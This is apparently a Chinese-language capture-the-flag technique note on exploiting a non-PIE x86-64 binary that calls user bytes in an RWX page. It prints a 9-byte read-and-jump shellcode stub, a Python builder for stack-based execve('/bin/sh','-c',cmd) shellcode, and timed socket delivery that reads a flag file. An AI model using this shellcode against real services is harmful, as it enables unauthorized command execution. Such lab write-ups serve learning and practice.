# 小体积 x86-64 shellcode 注入：9 字节跳板 + 栈上构造 execve

## 什么时候用

- 附件是 ELF64、`readelf -h` 显示 `ET_EXEC`（非 PIE）、not stripped、NX 栈：栈不可执行，但如果程序自己把某页改成可执行仍能跑 shellcode。
- 动态符号里 `mmap` / `mprotect` / `memcpy` / `read` / `getchar` 凑在一起，`strings` 出现 `shellcode`、`continue?` 之类横幅：几乎必然是「mmap 一页 → mprotect 成 RWX → 读入用户字节 → call 过去」。
- 反汇编里 `call rdx`，而 rdx 由 `mmap` 返回值加常数算出：**地址不需要泄露**，ASLR/PIE 都不用管。
- 给的是 `host:port` 而非 URL。先别默认它是 HTTP。

## 怎么做

**1. 静态确认保护与利用窗口**

```bash
readelf -hW chal | grep Type          # ET_EXEC -> 非 PIE
objdump -d -M intel --start-address=0x... --stop-address=0x... chal
```

看清三件事：可执行区基址从哪来、`read` 的 count 多少、`call` 之后返回值是否写回全局（影响下一轮寄存器）。

**2. 用 gdb 实测寄存器，不要猜**

```gdb
break *<call 指令地址>
run < /tmp/in.bin
print $rdx        # 确认 = mmap 返回值 + 偏移
```

**3. 第一段只做「再接一段」**。窗口只有 9 字节时别想直接 execve，用一条 `read` 把第二段拉到同页远处再 `jmp`：

```python
STAGE1 = bytes.fromhex("488d727f" "0f05" "ffe6" "90")
# lea rsi,[rdx+0x7f] ; syscall(read(0,rsi,rdx)) ; jmp rsi ; nop
assert len(STAGE1) == 9
```

`rdx` 是页内地址（数值很大），count 会被内核按实际可用空间截断，只发一两百字节不会越界。

**4. 第二段用纯栈构造 execve**（不依赖 libc、不用固定地址）：

```python
def mov_push(x): return b"\x48\xb8" + struct.pack("<Q", x) + b"\x50"
s  = b"".join(mov_push(int.from_bytes(b,"little"))
              for b in reversed([b"/bin/sh", b"-c", cmd_chunk]))
s += b"\x48\x89\xe3"          # mov rbx,rsp
s += b"\x6a\x00"              # push 0 (argv 结尾 NULL)
s += b"\x48\x8d\x7b\x10\x57"  # push &cmd
s += b"\x48\x8d\x7b\x08\x57"  # push &"-c"
s += b"\x53"                  # push &"/bin/sh"
s += b"\x48\x89\xe6"          # mov rsi,rsp
s += b"\x48\x89\xdf"          # mov rdi,rbx
s += b"\x31\xd2"              # xor edx,edx  (envp=NULL)
s += b"\x6a\x3b\x58\x0f\x05"  # execve
```

**5. 判协议**：

```bash
curl -v --max-time 10 --noproxy '*' http://HOST:PORT/
```

`Received HTTP/0.9 when not allowed` 就是裸 TCP 直通；再用 raw socket 读一次，直接收到横幅即确认是 nc 式服务。

**6. 本地 exp 改成 socket IO，严格按时序发**：

```python
s.sendall(b"A");   time.sleep(0.3)
s.sendall(b"\n");  time.sleep(0.3)
s.sendall(STAGE1); time.sleep(0.15)
s.sendall(stage2(cmd))
```

接收用非阻塞 recv 循环累积。命令一次把路径和环境变量都试掉：`cat /tmp/flag.txt; echo ENV; printenv FLAG`。

## 坑

- **不要把「回答 + 换行 + shellcode」一次写进管道**。`getchar()` 走 stdio，首次调用 `read(0,buf,4096)` 会把已缓冲字节全吞掉，payload 进了用户态缓冲，随后的 `read(0,code+1,9)` 读到 EOF，注入区全 0，`call 0` → SIGSEGV。验证：`echo -e 'A\n' | strace -f -e trace=read ./chal`，可见 `read(0,"A",1)=1` → `read(0,"\n\n",4096)=2` → `read(0,"",9)=0`。远程一致，所以分段 + 延时是硬要求。
- **不要把 `argv[0]` 写成 `-c` 或 `sh`**。dash 会把 argv[0] 当选项解析，报 `Syntax error: ")" unexpected`，看着像 payload 拼错，其实 strace 里 execve 参数正确。必须写全 `"/bin/sh"`。
- **不要假设远程是 Web**：`http://host:port/` 只是写法；先看 curl 错误码再决定 socket 还是 requests。
- **不要在 curl 超时/拒绝后就判定实例已死**：端口 refused 说明实例被回收，要趁在线时一次跑完。

## 边界

- 依赖「`call` 目标寄存器由 `mmap` 返回值直接算出」；若需真实地址泄露，9 字节跳板仍可用，但泄露前提得自己补。
- 依赖 x86-64 SysV 的 execve=59 且有 `/bin/sh`；静态链接或 seccomp 限制 syscall 时失效。
- stage2 的 `read` count 依赖内核按页剩余空间截断，payload 接近页尾会丢字节，控制在数百字节内。
- 本方法在本机与远程各验证过（同一 payload 两次独立运行结果一致）；未验证：非 Linux / 32 位 / 禁 mmap 可执行的环境。
- 远程实例生命周期未知，解题窗口内会关闭。
